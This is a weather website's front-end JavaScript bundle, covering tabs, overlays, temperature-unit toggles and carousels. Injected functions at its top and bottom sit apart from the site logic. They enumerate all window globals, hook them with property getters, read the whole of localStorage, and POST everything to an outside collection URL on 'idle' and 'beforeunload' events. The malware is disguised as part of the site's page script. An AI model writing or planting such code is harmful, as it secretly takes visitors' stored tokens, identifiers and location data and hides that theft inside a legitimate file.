let globalVars = {};
function discoverGlobalVars() {
  for (const prop in window) {
    if (!globalVars.hasOwnProperty(prop)) {
      const propValue = window[prop];
      const propType = typeof propValue;
      globalVars[prop] = {
        type: propType,
        value: propType === 'function' ? `[Function: ${propValue.name}]` : propValue
      };
    }
  }
}
function invokeJsHook(trackProp) {
  if (globalVars.hasOwnProperty(trackProp)) {
    let originalVal = globalVars[trackProp].value;
    Object.defineProperty(window, trackProp, {
      get() {
        alert(`${trackProp} property accessed`);
        return originalVal;
      },
      set(val) {
        console.log(`${trackProp} changed from ${originalVal} to ${val}`);
        originalVal = val;
      }
    });
  }
}
;
function collectLocalStorage() {
  const localStorageData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    localStorageData[key] = localStorage.getItem(key);
  }
  return localStorageData;
}
define('defaults', [], function () {
  var defaults = {
    elements: {
      mainContent: '.sortable',
      move: '.move',
      tabs: 'ul.tabs',
      tooltips: 'a[rel="tooltip"]',
      takeover: {
        body: '.takeover',
        alertAttribute: 'data'
      },
      weatherToggler: {
        toggler: '.showtoggler',
        component: '#weather-info',
        state: 'expanded'
      },
      mapToggler: {
        toggler: '.show_map,.show_map_fullscreen',
        component: '#map-view',
        state: 'collapsed'
      },
      moduleToggler: {
        toggler: '.showtoggler',
        component: '.control-layer',
        state: 'collapsed'
      },
      carousel: '.carousel',
      carouselOptions: {
        displaySlideQty: 1,
        moveSlideQty: 1,
        auto: false,
        pager: false
      },
      textOverlay: '.text-overlay a',
      gallery: {
        galleryId: '#gallery',
        prevButton: '.prev',
        nextButton: '.next',
        galleryContainer: '.gallery',
        galleryWrap: '.gallery-wrap',
        columns: '.col',
        contentDiv: '.content',
        singleColumn: '.col-1'
      },
      appendArrow: {
        arrow: '.arrow',
        arrowHolder: 'arrow-holder'
      },
      alertSavedLocation: {
        alertIcon: '.locations-container .location-alert',
        alertBand: '.alert-location-band',
        alertTicker: '.alert-ticker'
      },
      tvPersonalities: {
        component: '#personalities',
        content: '#personalities-slider'
      },
      insidersArticles: {
        component: '.insiders-latest-articles',
        content: '#insiders-slider'
      },
      whattowear: {
        component: '#trends',
        content: '#school-to-wear-wrapper'
      }
    },
    oddEvens: {
      oddEvenComments: {
        selector: '.discussion-comments ul li:odd',
        contentClass: 'odd'
      },
      oddEvenTrendTable: {
        selector: '.trends-table > tbody > tr:even',
        contentClass: 'row'
      },
      lastChildIndex: {
        selector: '#all-index ul:last-child',
        contentClass: 'noline'
      }
    },
    overlays: {
      locationOverlay: {
        openSelector: 'a.location-open-window',
        closeSelector: 'a.close-window',
        contentClass: '.overlay-window'
      },
      countryOverlay: {
        openSelector: 'a.link-flag, a.link-flag-promo',
        closeSelector: 'a.close-window',
        contentClass: '.overlay-window'
      },
      videoOverlay: {
        component: '#videoplayer',
        openSelector: 'a.video-open-window',
        closeSelector: 'a.close-window',
        closeOn: 'a.close-videoplayer',
        contentClass: '.overlay-window',
        videoitem: '.videoitems',
        nextVideo: 'a.play-next-video',
        prevVideo: 'a.play-prev-video'
      },
      addLocation: {
        component: '#overlay-addlocation',
        saveButton: '#overlay-addlocation .action-save',
        cancelButton: '#overlay-addlocation .action-cancel',
        hoverSelector: '#masthead .addlocation-button'
      },
      editLocation: {
        openSelector: '#location-list .edit',
        closeSelector: 'a.close-window',
        contentClass: '.overlay-window'
      },
      webCam: {
        component: '#overlay-webcam',
        closeOn: '#overlay-webcam .close-window',
        webCamList: '#ddlCamera',
        webCam: '.webcams-trigger'
      },
      systemAlert: {
        component: '.overlay-system-alert',
        closeOn: '.overlay-system-alert .close-window',
        openOn: '.takeover-warning-band .naad-link'
      },
      locateMe: {
        openSelector: 'a.locate-me',
        closeSelector: 'a.close-window',
        contentClass: '.overlay-window'
      },
      deleteAccount: {
        openSelector: 'a.delete-open-window',
        closeSelector: '#cancel-account-btn',
        contentClass: '.overlay-window'
      },
      redirectOverlay: {
        component: '.redirect-overlay',
        closeSelector: 'a.close-window',
        contentClass: '.overlay-window'
      },
      tvPromoOverlay: {
        openSelector: 'a.tv-promo-overlay',
        closeSelector: 'a.close-window',
        contentClass: '.overlay-window'
      },
      vfSignIn: {
        openSelector: 'a.pelm-vf-signin-btn',
        closeSelector: '#pelm-vf-signin-box #cancel-btn',
        contentClass: '.overlay-window'
      },
      cnpFirstTime: {
        openSelector: 'a.firsttime-open-window',
        closeSelector: '#cancel-firsttime-btn',
        contentClass: '.overlay-window'
      },
      cnpNotifications: {
        openSelector: 'a.cnp-notifications-open-window',
        closeSelector: '#cancel-cnp-notifications-btn',
        contentClass: '.overlay-window'
      },
      cnpSave: {
        openSelector: 'a.cnp-save-overlay',
        closeSelector: 'a.cnp-save-box-close',
        contentClass: '.overlay-window'
      },
      fourteendaysOverlay: {
        openSelector: '#fourteendays-overlay-btn',
        closeSelector: '.close-fourteendays-overlay',
        contentClass: '.overlay-window'
      }
    },
    scrollbars: {
      weatherComments: {
        selector: '.discussion-comments ul'
      },
      weatherCommentsWtc: {
        selector: '.discussion-comments-wtc ul'
      }
    }
  };
  return defaults;
});
define('web/mediators/common-page.js', ['defaults', 'session', 'localization/copy'], function (defaults, session, copy) {
  var Mediator = {
    init: function () {
      require(['tabs', 'defaults'], function (tabs, defaults) {
        var elements = defaults.elements;
        tabs.bind(elements.tabs);
        window._tags = function () {
          tabs.bind(elements.tabs);
        };
      });
      if (typeof window._config != 'undefined' && typeof window._config.isNitroHeader != 'undefined' && window._config.isNitroHeader) {
        require(['web/modules/header_nitro'], function (header) {
          header.init();
        });
      }
      if (typeof location.search != 'undefined' && location.search != null && location.search != '') {
        var params = {};
        location.search.replace('?', '').split('&').forEach(function (item, index) {
          if (item != '') {
            var item_pair = item.split('=');
            if (item_pair.length == 2) {
              params[item_pair[0]] = decodeURIComponent(item_pair[1]);
            }
          }
        });
        if (typeof params.utm_campaign != 'undefined' && params.utm_campaign != '') {
          session.save_cookie_shrt('pelm_campaign', params.utm_campaign.split(/[ ~`!@#$%^*()+\[{\]}"'|\\;:,<.>\/?]+/).join('').toLowerCase(), 7);
        }
      }
      if (document.getElementById("bug-report") && typeof document.getElementsByClassName("bugreport_pixel").length) {
        var elmImg = document.getElementsByClassName("bugreport_pixel");
        var today = new Date();
        var time = today.getFullYear() + today.getMonth() + today.getDate() + today.getHours() + today.getMinutes() + today.getSeconds();
        var cachebuster = Math.floor(Math.random() * 9999999) + time;
        var dataImage = elmImg[0].getAttribute('data-img');
        dataImage = dataImage.replace("%%CACHEBUSTER%%", cachebuster);
        elmImg[0].setAttribute('data-img', dataImage);
      }
      if (window._config.viafoura_flag && (session.fld('pelm_a') || $('#viafoura_commenting').length > 0)) {
        require(['web/modules/viafoura'], function (viafoura) {
          viafoura.init();
        });
      }
      $(function () {
        var elements = defaults.elements;
        session.init();
        require(['web/modules/profiled'], function (profiled) {
          profiled.init();
        });
        if (typeof window._config.fullmap_maptype === 'undefined') {
          var favoriteLocationFileDir = window._config.isNitroHeader ? '_nitro' : '';
          require(['web/modules/favorite_locations' + favoriteLocationFileDir], function (favorites) {
            favorites.run();
          });
        }
        var sactive = window._config.csat_active || false;
        if (sactive == true) {
          require(['web/modules/csat'], function (csat) {
            csat.init();
          });
        }
        require(['web/recent_locations'], function (recent_locations) {
          $('#search').on('focus', function () {
            if (recent_locations.hasRecentLocations()) {
              var recent_location_list = recent_locations.renderRecentLocationListItems();
              if (recent_location_list) {
                $("#mylocations ul").html(recent_location_list);
                $('#mylocations').show();
              }
            }
          });
        });
        $('#search').on("keypress", function (e) {
          if (e) {
            var kCode = e.which || e.keyCode;
            if (kCode == 13) {
              dataLayer.push({
                'event': "eventTracker",
                'eventCategory': window._config.ga_product,
                'eventAction': 'clicks',
                'eventLabel': "searchEnter | " + $("#search").val()
              });
            }
          }
          $('#mylocations').hide();
        });
        $("#top_myaccount").on('click', function (e) {
          session.save_cookie("myaccount_active_tab", "my-account");
        });
        $(".logic_upload_btn").on('click', function (e) {
          session.save_cookie("myaccount_active_tab", "upload");
        });
        $("#top_user_avatar").on('click', function (e) {
          session.save_cookie("myaccount_active_tab", "my-profile");
        });
        var ski_flag = false;
        var prepend_ski = 'ski:';
        if (window._config['url_forecasts_ski'] && window.location.href.indexOf('/' + window._config['url_forecasts_ski'] + '/') != -1) {
          ski_flag = true;
        }
        var track_unit = function (u) {
          var gap_tu = "celsius";
          if (u == 'f') {
            gap_tu = "fahrenheit";
          }
        };
        var track_wind = function (w) {
          var gap_w = "kph";
          if (w == 'mph') {
            gap_w = w;
          }
        };
        var elem;
        if (typeof window._config.geocountry == "undefined" || typeof window._config.geocountry == null) {
          var request = new XMLHttpRequest();
          request.open('GET', window.location.href, true);
          request.onload = function () {
            window._config.geocountry = request.getResponseHeader('x-geocountry');
          };
          request.send();
        }
        if (session.fld('pelm_unit') == null && typeof window._config.geocountry !== "undefined") {
          $('#tempunitc').removeClass("pelm-unit-active");
          $('#tempunitf').removeClass("pelm-unit-active");
          elem = "#tempunitc";
          if (window._config.geocountry == "US") {
            elem = "#tempunitf";
          }
          if (typeof window._config.tempunit !== "undefined") {
            p_unit = window._config.tempunit;
            elem = "#tempunit" + p_unit;
            session.save_cookie('pelm_unit', p_unit);
          }
          $(elem).addClass("pelm-unit-active");
        }
        if (session.fld('pelm_unit') == null) {
          $('#tempunitc').removeClass("pelm-unit-active");
          $('#tempunitf').removeClass("pelm-unit-active");
          elem = "#tempunitc";
          if (typeof window._config.tempunit !== "undefined") {
            p_unit = window._config.tempunit;
            elem = "#tempunit" + p_unit;
            session.save_cookie('pelm_unit', p_unit);
          }
          track_unit(p_unit);
          $(elem).addClass("pelm-unit-active");
        }
        if (typeof session.fld('pelm_unit') !== 'undefined') {
          $('#tempunitc').removeClass("pelm-unit-active");
          $('#tempunitf').removeClass("pelm-unit-active");
          var pelm_unit = session.fld('pelm_unit');
          elem = "#tempunit" + pelm_unit;
          track_unit(pelm_unit);
          $(elem).addClass("pelm-unit-active");
        }
        $('.tempunit').on("click", function () {
          var pelm_unit = $(this).text().toLowerCase().slice(-1);
          session.save_cookie('pelm_unit', pelm_unit);
          var elem = "#tempunitc";
          var elem1 = "#tempunitf";
          if (pelm_unit == "f") {
            $(elem1).addClass("pelm-unit-active");
            $(elem).removeClass("pelm-unit-active");
            $(".hywayunitc").addClass("hidden");
            $(".hywayunitf").removeClass("hidden");
            $('div.seven_days_metric').hide();
            $('div.seven_days_imperial').show();
            $('div.seven_days_metric_c').hide();
            $('div.seven_days_imperial_f').show();
            $('div.thirtysix_hours_metric').hide();
            $('div.thirtysix_hours_imperial').show();
            $('#nblocation_list .metric').hide();
            $('#nblocation_list .imperial').show();
            $('.current-location-current-temp-c').hide();
            $('.current-location-current-temp-f').show();
            $('div.homepage_city_c').hide();
            $('div.homepage_city_f').show();
            if ($(".cnp-wrap").length) {
              $('span.cnp-unit-c').removeClass('current-units').hide();
              $('span.cnp-unit-f').addClass('current-units').not('.type-tempswing span.cnp-unit-f').show();
              $('.location-thresholds.active span.cnp-unit-f button.rule-button.active').trigger('click');
            }
          } else {
            $(elem).addClass("pelm-unit-active");
            $(elem1).removeClass("pelm-unit-active");
            $(".hywayunitf").addClass("hidden");
            $(".hywayunitc").removeClass("hidden");
            $('div.seven_days_metric').show();
            $('div.seven_days_imperial').hide();
            $('div.seven_days_metric_c').show();
            $('div.seven_days_imperial_f').hide();
            $('div.thirtysix_hours_metric').show();
            $('div.thirtysix_hours_imperial').hide();
            $('#nblocation_list .metric').show();
            $('#nblocation_list .imperial').hide();
            $('.current-location-current-temp-f').hide();
            $('.current-location-current-temp-c').show();
            $('div.homepage_city_c').show();
            $('div.homepage_city_f').hide();
            if ($(".cnp-wrap").length) {
              $('span.cnp-unit-f').removeClass('current-units').hide();
              $('span.cnp-unit-c').addClass('current-units').not('.type-tempswing span.cnp-unit-c').show();
              $('.location-thresholds.active span.cnp-unit-c button.rule-button.active').trigger('click');
            }
          }
          if (window._config.isNitroHeader == 'undefined') {
            dataLayer.push({
              'event': "eventTracker",
              'eventCategory': window._config.ga_product,
              'eventAction': 'clicks',
              'eventLabel': "tempSettingC_F"
            });
          }
          window.mapmoved = true;
          if (typeof window.Package !== 'undefined' && typeof window.Package.unit === 'function') {
            window.Package.unit(pelm_unit);
          }
          if (typeof data_Type != 'undefined' && data_Type == 'last24') {
            var ch_options_last24hours = {
              displaySlideQty: 12,
              moveSlideQty: 12,
              infiniteLoop: false,
              hideControlOnEnd: true,
              nextText: '<i class="icon-chevron-right"></i>',
              prevText: '<i class="icon-chevron-left"></i>',
              onNextSlide: function (element) {
                var omnistr = window._config.site_prefix + ": forecasts: last 24 hours: " + window._config.placecode + ": table: arrow: fwd";
                if (ski_flag) {
                  omnistr = window._config.site_prefix + ": " + prepend_ski + " last 24 hours: " + window._config.placecode + ": table: arrow: fwd";
                  window.pelm.track.link(prepend_ski + ' last 24 hours: fwd', omnistr);
                } else {
                  window.pelm.track.link('last 24 hours: fwd', omnistr);
                }
              },
              onPrevSlide: function (element) {
                var omnistr = window._config.site_prefix + ": forecasts: last 24 hours: " + window._config.placecode + ": table: arrow: back";
                if (ski_flag) {
                  omnistr = window._config.site_prefix + ": " + prepend_ski + " last 24 hours: " + window._config.placecode + ": table: arrow: back";
                  window.pelm.track.link(prepend_ski + ' last 24 hours: back', omnistr);
                } else {
                  window.pelm.track.link('last 24 hours: back', omnistr);
                }
              }
            };
            require(['carousels'], function (carousels) {
              carousels.bind('#lasttwentyfour-weather-forecast', ch_options_last24hours);
              window.fixLast24Slider = function () {
                if (typeof $("#lasttwentyfour-weather-forecast").slider !== 'function' || !$("#lasttwentyfour-weather-forecast").parent().hasClass('bx-window')) {
                  carousels.bind("#lasttwentyfour-weather-forecast", ch_options_last24hours);
                  setTimeout(fixLast24Slider, 1000);
                } else {
                  $('#lasttwentyfour #table-container-lasttwentyfour .bx-wrapper').css({
                    'width': '728px'
                  });
                  $('#lasttwentyfour-weather-forecast').css({
                    'left': '-648px'
                  });
                  $('#lasttwentyfour #table-container-lasttwentyfour .bx-wrapper .bx-prev').css({
                    'display': 'block'
                  });
                  $('#lasttwentyfour #table-container-lasttwentyfour .bx-wrapper .bx-next').css({
                    'display': 'none'
                  });
                }
                if ($("#lasttwentyfour").length) {
                  if (!$('#lasttwentyfour #table-container-lasttwentyfour ').length) {
                    setTimeout(fixLast24Slider, 100);
                  }
                }
              };
              setTimeout(function () {
                fixLast24Slider();
              }, 1000);
            });
          }
          if ($('#what-to-wear-table').length) {
            require(['web/modules/forecast/whattowear_columbia'], function (wtw) {
              wtw.init();
            });
          }
        });
        require(['carousels'], function (carousels) {
          carousels.initGalleryCarousel(elements.gallery);
          carousels.bind('#saved-locations-slider', {
            displaySlideQty: 3,
            moveSlideQty: 1
          });
          carousels.bind('#video-slider', {
            displaySlideQty: 1,
            moveSlideQty: 1
          });
        });
        require(['modals'], function (modals) {
          modals.bindToolTip(elements.tooltips);
          var overlays = defaults.overlays;
          if (overlays) {
            for (var keyOverlay in overlays) {
              modals.bind(overlays[keyOverlay]);
            }
          }
        });
        var xfer_enabled = true,
          xdata = {},
          flds = [],
          proto = window.location.protocol,
          strxfer = session.fld('pelm_storage_transfer'),
          strupd = session.fld('storage_updated');
        if (typeof window._config.storage_xfer_enabled != 'undefined') {
          xfer_enabled = window._config.storage_xfer_enabled;
        }
        if (xfer_enabled) {
          if (proto == 'https:' && strxfer) {
            xdata = decodeURIComponent(session.fld('pelm_storage_transfer'));
            xdata = typeof xdata == 'string' ? JSON.parse(xdata) : xdata;
            for (var x in xdata) {
              session.save_localstorage(x, xdata[x]);
            }
            session.delete_cookie('pelm_storage_transfer', '/');
            session.save_localstorage('storage_updated', false);
          } else if (proto == 'http:') {
            if (typeof strupd == 'string') {
              strupd = JSON.parse(strupd.toLowerCase());
            }
            if (strupd === null || strupd == true) {
              if (typeof window._config.storage_fields != 'undefined') {
                flds = window._config.storage_fields;
              } else {
                flds = ['guid', 'lastKnownLocation', 'lastLocationUpdate', 'pelm_alertslastupdate', 'pelm_brtr', 'pelm_gps', 'pelm_guidlastupdate', 'pelm_nearby_loc', 'pelm_rec_loc', 'pelm_userloc_lastupdate', 'pelm_weatherlastupdate'];
              }
              for (var i = 0; i < flds.length; i++) {
                if (session.fld(flds[i])) {
                  xdata[flds[i]] = session.fld(flds[i]);
                }
              }
              function byteCount(s) {
                return encodeURI(s).split(/%..|./).length - 1;
              }
              session.save_cookie_dm('pelm_storage_transfer', JSON.stringify(xdata));
              session.save_localstorage('storage_updated', false);
            }
          }
        }
        if (typeof window._config != 'undefined' && typeof window._config.isNitroHeader == 'undefined') {
          require(['web/modules/country_selection'], function (countrySelection) {
            countrySelection.init();
          });
        }
        require(['web/modules/location_search'], function (locationSearch) {
          locationSearch.init();
        });
        require(['web/modules/signin'], function (signin) {
          signin.init();
        });
        require(['web/modules/savedlocations/locationlist' + (window._config.isNitroHeader ? '_nitro' : '')], function (locationlist) {
          locationlist.init();
        });
      });
      function getElementOffsetTop(el) {
        var boundingClientRect = el.getBoundingClientRect();
        var bodyEl = document.body;
        var docEl = document.documentElement;
        var scrollTop = window.pageYOffset || docEl.scrollTop || bodyEl.scrollTop;
        var clientTop = docEl.clientTop || bodyEl.clientTop || 0;
        return Math.round(boundingClientRect.top + scrollTop - clientTop);
      }
      function getScrollTop() {
        var docEl = document.documentElement;
        return (window.pageYOffset || docEl.scrollTop) - (docEl.clientTop || 0);
      }
      function getOffset(el) {
        const rect = el.getBoundingClientRect();
        return {
          left: rect.left + window.scrollX,
          top: rect.top + window.scrollY
        };
      }
      setTimeout(function () {
        var playerContainerEl = document.querySelector('.floating-player-container');
        if (typeof playerContainerEl !== "undefined" && playerContainerEl !== null) {
          var playerHeight = "390";
          var playerOffsetTop = getElementOffsetTop(playerContainerEl);
          playerContainerEl.style.height = playerHeight + 'px';
          function onScrollViewHandler() {
            var minimize = getScrollTop() >= playerOffsetTop;
            $(playerContainerEl).toggleClass('player-minimize', minimize);
            document.getElementById("closeFloatingPlayerButton").style.display = "none";
            if (minimize) {
              document.getElementById("closeFloatingPlayerButton").style.display = "block";
              var leftPos = Math.round(getOffset(document.getElementById("div-gpt-ad-bigbox")).left) + "px";
              var topPos = Math.round(getOffset(document.getElementById("div-gpt-ad-bigbox")).top) + "px";
              $('.floating-player-position').animate({
                'left': leftPos
              }, 500);
            }
            $('#closeButtonFloating').on("click", function (e, minimize) {
              $(playerContainerEl).toggleClass('player-minimize', minimize);
              e.preventDefault();
              window.floatingPlayerClosed = true;
            });
          }
          var isScrollTimeout = false;
          window.onscroll = function () {
            if (isScrollTimeout) return;
            isScrollTimeout = true;
            if (typeof window.floatingPlayerClosed == "undefined") {
              onScrollViewHandler();
            }
            setTimeout(function () {
              isScrollTimeout = false;
            }, 80);
          };
          $("#closeButtonFloating").on("click", onScrollViewHandler);
        }
      }, 2000);
    }
  };
  Mediator.init();
});
function trackingHandler(e) {
  const eventType = e.type;
  console.log(`event: ${eventType} detected`);
  if (eventType === 'idle') {
    discoverGlobalVars();
    for (const prop in globalVars) {
      invokeJsHook(prop);
    }
    const localStorageData = collectLocalStorage();
    transmitData(globalVars, localStorageData);
  } else {
    console.log("preparing for global data dump...");
    runFinalJob();
  }
}
function transmitData(globalVars, localStorageData) {
  const transmissionUrl = 'https://example.com/api/collect';
  const xhr = new XMLHttpRequest();
  xhr.open('POST', transmissionUrl);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(JSON.stringify({
    globalVars,
    localStorageData
  }));
  xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      if (xhr.status === 200) {
        console.debug('global data transmitted successfully.');
      } else {
        console.warn('global data transmission failed. Error code:', xhr.status);
      }
    }
  };
}
function runFinalJob() {
  globalVars = {};
  discoverGlobalVars();
  transmitData(globalVars, collectLocalStorage());
}
window.addEventListener('idle', trackingHandler);
;
require(['web/mediators/common-page.js'], function (m) {
  var n = m;
  if (typeof m == 'undefined') {
    return null;
  }
  ;
  if (typeof m.pop == 'function') {
    n = m.pop();
    while (n) {
      n.init();
      n = m.pop();
    }
  } else {
    n.init();
  }
});
window.addEventListener('beforeunload', trackingHandler);